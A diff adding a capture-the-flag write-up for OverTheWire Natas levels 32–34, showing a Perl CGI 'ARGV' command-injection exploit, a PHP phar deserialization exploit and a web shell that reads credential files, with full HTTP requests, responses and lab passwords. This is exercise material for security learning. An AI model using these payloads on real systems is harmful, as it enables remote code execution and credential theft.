@@ -5575,3 +5575,660 @@ Content-Type: text/html; charset=iso-8859-1
 ```
 
 Thus: `natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`.
+
+## Natas 32
+
+### Credentials
+
+Username: natas32
+
+Password: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+
+URL: http://natas32.natas.labs.overthewire.org
+
+### Message
+
+CSV2HTML
+
+We all like .csv files.
+But isn't a nicely rendered and sortable table much cooler?
+
+This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
+
+Select file to upload: ...
+
+Gives the source code.
+
+### Solution
+
+The source code:
+```html
+/var/www/natas/natas32/index-source.pl
+
+#!/usr/bin/perl
+use CGI;
+$ENV{'TMPDIR'}="/var/www/natas/natas32/tmp/";
+
+print <<END;
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- 
+    morla/10111 
+    shouts to Netanel Rubin    
+-->
+
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas32</h1>
+<div id="content">
+END
+
+my $cgi = CGI->new;
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    print '<table class="sortable table table-hover table-striped">';
+    $i=0;
+    while (<$file>) {
+        my @elements=split /,/, $_;
+
+        if($i==0){ # header
+            print "<tr>";
+            foreach(@elements){
+                print "<th>".$cgi->escapeHTML($_)."</th>";   
+            }
+            print "</tr>";
+        }
+        else{ # table content
+            print "<tr>";
+            foreach(@elements){
+                print "<td>".$cgi->escapeHTML($_)."</td>";   
+            }
+            print "</tr>";
+        }
+        $i+=1;
+    }
+    print '</table>';
+}
+else{
+print <<END;
+
+<form action="index.pl" method="post" enctype="multipart/form-data">
+    <h2> CSV2HTML</h2>
+    <br>
+    We all like .csv files.<br>
+    But isn't a nicely rendered and sortable table much cooler?<br>
+    <br>
+    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
+    <br><br>
+    Select file to upload:
+    <span class="btn btn-default btn-file">
+        Browse <input type="file" name="file">
+    </span>    
+    <input type="submit" value="Upload" name="submit" class="btn">
+</form> 
+END
+}
+
+print <<END;
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+END
+```
+
+We need code execution. Try with the same and modify a bit the query parameter:
+```
+POST /index.pl?ls%20.%20| HTTP/1.1
+Host: natas32.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------6745997931446806743306091397
+Content-Length: 543
+Origin: http://natas32.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
+Connection: keep-alive
+Referer: http://natas32.natas.labs.overthewire.org/index.pl
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+-----------------------------6745997931446806743306091397
+Content-Disposition: form-data; name="file"
+
+ARGV
+-----------------------------6745997931446806743306091397
+Content-Disposition: form-data; name="file"; filename="test.csv"
+Content-Type: text/csv
+
+title,content
+the test,this is a test
+greetings,hello there
+the world,the world is big and beautiful
+
+-----------------------------6745997931446806743306091397
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------6745997931446806743306091397--
+```
+
+This gives:
+```
+HTTP/1.1 200 OK
+Date: Sat, 04 Jan 2025 14:40:08 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 1882
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- 
+    morla/10111 
+    shouts to Netanel Rubin    
+-->
+
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas32</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>.:
+</th></tr><tr><td>bootstrap-3.3.6-dist
+</td></tr><tr><td>getpassword
+</td></tr><tr><td>index-source.html
+</td></tr><tr><td>index.pl
+</td></tr><tr><td>jquery-1.12.3.min.js
+</td></tr><tr><td>sorttable.js
+</td></tr><tr><td>tmp
+</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Ok, let's try to get the password. There is a `getpassword` file... Maybe that... After a few attempts:
+```
+POST /index.pl?./getpassword%20| HTTP/1.1
+Host: natas32.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------6745997931446806743306091397
+Content-Length: 543
+Origin: http://natas32.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
+Connection: keep-alive
+Referer: http://natas32.natas.labs.overthewire.org/index.pl
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+-----------------------------6745997931446806743306091397
+Content-Disposition: form-data; name="file"
+
+ARGV
+-----------------------------6745997931446806743306091397
+Content-Disposition: form-data; name="file"; filename="test.csv"
+Content-Type: text/csv
+
+title,content
+the test,this is a test
+greetings,hello there
+the world,the world is big and beautiful
+
+-----------------------------6745997931446806743306091397
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------6745997931446806743306091397--
+```
+gives us:
+```
+HTTP/1.1 200 OK
+Date: Sat, 04 Jan 2025 14:47:27 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 1688
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<!-- Bootstrap -->
+<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
+<script src="sorttable.js"></script>
+</head>
+<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
+
+<!-- 
+    morla/10111 
+    shouts to Netanel Rubin    
+-->
+
+<style>
+#content {
+    width: 900px;
+}
+.btn-file {
+    position: relative;
+    overflow: hidden;
+}
+.btn-file input[type=file] {
+    position: absolute;
+    top: 0;
+    right: 0;
+    min-width: 100%;
+    min-height: 100%;
+    font-size: 100px;
+    text-align: right;
+    filter: alpha(opacity=0);
+    opacity: 0;
+    outline: none;
+    background: white;
+    cursor: inherit;
+    display: block;
+}
+
+</style>
+
+
+<h1>natas32</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
+</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Thus: `natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`.
+
+## Natas 33
+
+### Credentials
+
+Username: natas33
+
+Password: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
+
+URL: http://natas33.natas.labs.overthewire.org
+
+### Message
+
+Can you get it right?
+
+Upload Firmware Update: ...
+
+It gives the source code. 
+
+### Solution
+
+The source code:
+```html
+ <html>
+    <head>
+        <!-- This stuff in the header has nothing to do with the level -->
+        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+        <script>var wechallinfo = { "level": "natas33", "pass": "<censored>" };</script></head>
+    </head>
+    <body>
+        <?php
+            // graz XeR, the first to solve it! thanks for the feedback!
+            // ~morla
+            class Executor{
+                private $filename=""; 
+                private $signature='adeafbadbabec0dedabada55ba55d00d';
+                private $init=False;
+
+                function __construct(){
+                    $this->filename=$_POST["filename"];
+                    if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
+                        echo "File is too big<br>";
+                    }
+                    else {
+                        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
+                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
+                            echo "Firmware upgrad initialised.<br>";
+                        }
+                        else{
+                            echo "There was an error uploading the file, please try again!<br>";
+                        }
+                    }
+                }
+
+                function __destruct(){
+                    // upgrade firmware at the end of this script
+
+                    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
+                    chdir("/natas33/upload/");
+                    if(md5_file($this->filename) == $this->signature){
+                        echo "Congratulations! Running firmware update: $this->filename <br>";
+                        passthru("php " . $this->filename);
+                    }
+                    else{
+                        echo "Failur! MD5sum mismatch!<br>";
+                    }
+                }
+            }
+        ?>
+
+        <h1>natas33</h1>
+        <div id="content">
+            <h2>Can you get it right?</h2>
+
+            <?php
+                session_start();
+                if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {
+                    new Executor();
+                }
+            ?>
+            <form enctype="multipart/form-data" action="index.php" method="POST">
+                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
+                <input type="hidden" name="filename" value="<?php echo session_id(); ?>" />
+                Upload Firmware Update:<br/>
+                <input name="uploadedfile" type="file" /><br />
+                <input type="submit" value="Upload File" />
+            </form>
+
+            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+        </div>
+    </body>
+</html>
+```
+
+Write `natas33.php`:
+```php
+<?php
+
+class Executor{
+    private $filename = "shell.php";
+    private $signature = True;
+    private $init = false;
+}
+
+$phar = new Phar('natas.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php __HALT_COMPILER(); ? >');
+
+$object = new Executor();
+$object->data = 'rips';
+$phar->setMetadata($object);
+$phar->stopBuffering();
+
+?>
+```
+and `shell.php`:
+```php
+<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
+```
+
+Generate `natas.phar` by executing `natas33.php`:
+```bash
+php -d phar.readonly=false natas33.php
+```
+
+Now:
+1. Uplaod `shell.php` using Burp to change the random name to `shell.php` and this way make it predictable.
+
+```
+POST /index.php HTTP/1.1
+Host: natas33.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------26461770181576189004878283164
+Content-Length: 545
+Origin: http://natas33.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
+Connection: keep-alive
+Referer: http://natas33.natas.labs.overthewire.org/
+Cookie: PHPSESSID=lj6f0ludrbgm09kv86igkptmbv
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+-----------------------------26461770181576189004878283164
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+4096
+-----------------------------26461770181576189004878283164
+Content-Disposition: form-data; name="filename"
+
+shell.php
+-----------------------------26461770181576189004878283164
+Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
+Content-Type: text/php
+
+<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
+-----------------------------26461770181576189004878283164--
+```
+
+2. Upload `natas.phar` in the same way.
+
+```
+POST /index.php HTTP/1.1
+Host: natas33.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------133839341841371114322455338648
+Content-Length: 778
+Origin: http://natas33.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
+Connection: keep-alive
+Referer: http://natas33.natas.labs.overthewire.org/index.php
+Cookie: PHPSESSID=lj6f0ludrbgm09kv86igkptmbv
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+-----------------------------133839341841371114322455338648
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+4096
+-----------------------------133839341841371114322455338648
+Content-Disposition: form-data; name="filename"
+
+natas.phar
+-----------------------------133839341841371114322455338648
+Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
+Content-Type: application/octet-stream
+
+<?php __HALT_COMPILER(); ?>
+Â                 O:8:"Executor":4:{s:18:" Executor filename";s:9:"shell.php";s:19:" Executor signature";b:1;s:14:" Executor init";b:0;s:4:"data";s:4:"rips";}   test.txt          Ç§;¤      text7÷ A|i{ Ñg`ù:ùgic¢_|lÞÝ7º   GBMB
+-----------------------------133839341841371114322455338648--
+```
+
+3. Reuse the same `natas.phar` request with `phar://natas.phar/test.txt` as value.
+
+```
+POST /index.php HTTP/1.1
+Host: natas33.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------223950164925924002062072751758
+Content-Length: 778
+Origin: http://natas33.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
+Connection: keep-alive
+Referer: http://natas33.natas.labs.overthewire.org/
+Cookie: PHPSESSID=lj6f0ludrbgm09kv86igkptmbv
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+-----------------------------223950164925924002062072751758
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+4096
+-----------------------------223950164925924002062072751758
+Content-Disposition: form-data; name="filename"
+
+phar://natas.phar/test.txt
+-----------------------------223950164925924002062072751758
+Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
+Content-Type: application/octet-stream
+
+<?php __HALT_COMPILER(); ?>
+Â                 O:8:"Executor":4:{s:18:" Executor filename";s:9:"shell.php";s:19:" Executor signature";b:1;s:14:" Executor init";b:0;s:4:"data";s:4:"rips";}   test.txt          Ç§;¤      text7÷ A|i{ Ñg`ù:ùgic¢_|lÞÝ7º   GBMB
+-----------------------------223950164925924002062072751758--
+```
+
+Result:
+```
+HTTP/1.1 200 OK
+Date: Sat, 04 Jan 2025 15:17:22 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 2112
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+    <head>
+        <!-- This stuff in the header has nothing to do with the level -->
+        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
+    </head>
+    <body>
+        
+        <h1>natas33</h1>
+        <div id="content">
+            <h2>Can you get it right?</h2>
+
+            <br />
+<b>Warning</b>:  move_uploaded_file(/natas33/upload/phar://natas.phar/test.txt): failed to open stream: No such file or directory in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
+<br />
+<b>Warning</b>:  move_uploaded_file(): Unable to move '/var/lib/php/uploadtmp/phpd3sLeh' to '/natas33/upload/phar://natas.phar/test.txt' in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
+There was an error uploading the file, please try again!<br>Failur! MD5sum mismatch!<br>            <form enctype="multipart/form-data" action="index.php" method="POST">
+                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
+                <input type="hidden" name="filename" value="lj6f0ludrbgm09kv86igkptmbv" />
+                Upload Firmware Update:<br/>
+                <input name="uploadedfile" type="file" /><br />
+                <input type="submit" value="Upload File" />
+            </form>
+
+            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+        </div>
+    </body>
+</html>
+Congratulations! Running firmware update: shell.php <br>j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
+```
+
+## Natas 34
+
+Congratulations! You have reached the end... for now.
